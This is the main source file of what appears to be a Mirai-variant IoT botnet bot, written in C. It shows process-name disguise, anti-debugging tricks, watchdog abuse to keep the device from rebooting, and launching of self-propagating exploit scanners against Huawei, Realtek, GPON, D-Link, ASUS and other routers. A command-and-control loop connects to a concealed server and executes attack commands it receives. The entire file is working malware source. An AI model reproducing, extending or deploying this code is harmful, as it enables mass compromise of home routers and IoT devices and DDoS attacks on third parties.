#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "resolv.h"
#include "killer.h"
#include "scanner.h"
#include "util.h"
#include "huawei.h"
#include "hnap.h"
#include "realtek_scanner.h"
#include "thinkphp.h"
#include "jaws.h"
#include "gpon80_scanner.h"
#include "gpon443.h"
#include "comtrend.h"
#include "linksys.h"
#include "asus.h"
#include "netlink.h"
#include "dlink_scanner.h"
#include "tr064.h"


static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

#ifdef DEBUG
    static void segv_handler(int sig, siginfo_t *si, void *unused)
    {
        printf("got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
        exit(EXIT_FAILURE);
    }
#endif


void watchdog_maintain(void)
{
    watchdog_pid = fork();
    if(watchdog_pid > 0 || watchdog_pid == -1)
        return;

    int timeout = 1;
    int watchdog_fd = 0;
    int found = FALSE;

    table_unlock_val(TABLE_MISC_WATCHDOG);
    table_unlock_val(TABLE_MISC_WATCHDOG2);

    if((watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG2, NULL), 2)) != -1)
    {
        #ifdef DEBUG
            printf("[watchdog] found a valid watchdog driver\n");
        #endif
        found = TRUE;
        ioctl(watchdog_fd, 0x80045704, &timeout);
    }
    
    if(found)
    {
        while(TRUE)
        {
            #ifdef DEBUG
                printf("[watchdog] sending keep-alive ioctl call to the watchdog driver\n");
            #endif
            ioctl(watchdog_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    
    table_lock_val(TABLE_MISC_WATCHDOG);
    table_lock_val(TABLE_MISC_WATCHDOG2);

    #ifdef DEBUG
        printf("[watchdog] failed to find a valid watchdog driver, bailing out\n");
    #endif
    
    exit(0);
}
#ifdef SELFREP
void start_scanner(void)
{
	int rand_num = 0, processors = sysconf(_SC_NPROCESSORS_ONLN);
	
	srand(time(NULL));
	rand_num = rand() % 100;
	
	if(processors > 1)
	{
		#ifdef DEBUG
			printf("[debug] device has 2 or more processors, running both scanners.");
		#endif
		huawei_init();
		hnapscanner_scanner_init();
		realtekscanner_scanner_init();
		thinkphp_scanner();
        linksys_scanner_init();
        dlinkscanner_scanner_init();
        asus_scanner_init();
        netlink_scanner();
        jaws_scanner();
        gpon80_scanner();
        gpon443_scanner();
        comtrend_scanner();
        tr064_scanner_init();
		scanner_init();
	} else if(rand_num > 35)
	{
		huawei_init();
		hnapscanner_scanner_init();
		realtekscanner_scanner_init();
		thinkphp_scanner();
        linksys_scanner_init();
        dlinkscanner_scanner_init();
        asus_scanner_init();
        netlink_scanner();
        jaws_scanner();
        gpon80_scanner();
        gpon443_scanner();
        comtrend_scanner();
        tr064_scanner_init();
		scanner_init();
	} else
	{
		huawei_init();
		hnapscanner_scanner_init();
		realtekscanner_scanner_init();
		thinkphp_scanner();
        linksys_scanner_init();
        dlinkscanner_scanner_init();
        asus_scanner_init();
        netlink_scanner();
        jaws_scanner();
        gpon80_scanner();
        gpon443_scanner();
        comtrend_scanner();
        tr064_scanner_init();
		scanner_init();
	}
}
#endif


int main(int argc, char **args)
{
    char *tbl_exec_succ, name_buf[32], id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0;

    #ifndef DEBUG
        sigset_t sigs;

        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);

    #endif

    #ifdef DEBUG
        printf("DEBUG MODE YO\n");

        sleep(1);
    #endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();

    anti_gdb_entry(0);

    rand_init();

    util_zero(id_buf, 32);
    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    util_zero(name_buf, 32);

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);

    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

    attack_init();
    killer_init();
    watchdog_maintain();

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    attack_init();
    killer_init();
    watchdog_maintain();
    scanner_init();

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        if(pending_connection)
        {
            pending_connection = FALSE;

            if(!FD_ISSET(fd_serv, &fdsetwr))
            {
                #ifdef DEBUG
                    printf("[main] timed out while connecting to CNC\n");
                #endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    #ifdef DEBUG
                        printf("[main] error while connecting to CNC code=%d\n", err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if(id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }

                    #ifdef DEBUG
                        printf("[main] connected to CNC.\n");
                    #endif
                }
            }
        }
        else if(fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 1\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            if(len == 0)
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
                continue;
            }
            len = ntohs(len);
            if(len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 2\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

            #ifdef DEBUG
                printf("[main] received %d bytes from CNC\n", len);
            #endif

            if(len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    #ifndef USEDOMAIN
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_addr.s_addr = SERVIP;
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
    #else
    struct resolv_entries *entries;
    entries = resolv_lookup(SERVDOM);
    if (entries == NULL)
    {
        srv_addr.sin_addr.s_addr = SERVIP;
        return;
    } else {
        srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    }
    
    resolv_entries_free(entries);
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
    #endif
}

static void establish_connection(void)
{
    #ifdef DEBUG
        printf("[main] attempting to connect to CNC\n");
    #endif

    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[main] failed to call socket(). Errno = %d\n", errno);
        #endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if(resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
    #ifdef DEBUG
        printf("[main] tearing down connection to CNC!\n");
    #endif

    if(fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    sleep(1);
}
